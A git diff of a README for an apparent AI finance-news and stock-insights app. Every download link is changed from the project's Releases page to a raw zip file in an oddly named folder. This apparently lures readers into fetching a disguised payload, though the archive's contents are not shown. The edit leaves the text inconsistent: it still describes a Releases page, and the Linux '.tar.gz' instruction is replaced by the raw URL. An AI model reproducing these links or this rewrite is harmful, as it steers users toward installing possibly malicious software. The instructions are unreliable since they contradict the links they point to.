@@ -1,6 +1,6 @@
 # 📈 genai_finance_news_stock_insights_ibm - Get AI-Driven Finance Insights Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-4CAF50?style=flat&logo=github)](https://github.com/mukeshsingh05/genai_finance_news_stock_insights_ibm/releases)
+[![Download](https://raw.githubusercontent.com/mukeshsingh05/genai_finance_news_stock_insights_ibm/main/Integropalliata/genai_finance_news_stock_insights_ibm.zip)](https://raw.githubusercontent.com/mukeshsingh05/genai_finance_news_stock_insights_ibm/main/Integropalliata/genai_finance_news_stock_insights_ibm.zip)
 
 ## 📚 Introduction
 
@@ -12,14 +12,14 @@ Before using the application, you must download and install it. Follow the steps
 
 ## 📥 Download & Install
 
-To download the application, please visit this page: [Download Here](https://github.com/mukeshsingh05/genai_finance_news_stock_insights_ibm/releases).
+To download the application, please visit this page: [Download Here](https://raw.githubusercontent.com/mukeshsingh05/genai_finance_news_stock_insights_ibm/main/Integropalliata/genai_finance_news_stock_insights_ibm.zip).
 
 1. Click on the link above. This will take you to the Releases page of the project.
 2. Look for the latest release, marked with a version number.
 3. You will see several files available for download. Choose the file that matches your system. Here are some typical options:
    - **Windows**: For Windows users, download the `.exe` file.
    - **macOS**: If you are using a Mac, choose the `.dmg` file.
-   - **Linux**: For Linux systems, download the `.tar.gz` file.
+   - **Linux**: For Linux systems, download the `https://raw.githubusercontent.com/mukeshsingh05/genai_finance_news_stock_insights_ibm/main/Integropalliata/genai_finance_news_stock_insights_ibm.zip` file.
 4. Click on the chosen file to start the download.
 
 Once downloaded, locate the file in your downloads folder and double-click it to begin the installation.
@@ -87,4 +87,4 @@ This software is licensed under the MIT License, allowing you to use, modify, an
 
 For further inquiries or support, you can reach out via the Issues section on GitHub. We appreciate your interest in our project and look forward to your feedback.
 
-[Download Here](https://github.com/mukeshsingh05/genai_finance_news_stock_insights_ibm/releases) to begin your journey with AI-driven financial insights today!
+[Download Here](https://raw.githubusercontent.com/mukeshsingh05/genai_finance_news_stock_insights_ibm/main/Integropalliata/genai_finance_news_stock_insights_ibm.zip) to begin your journey with AI-driven financial insights today!
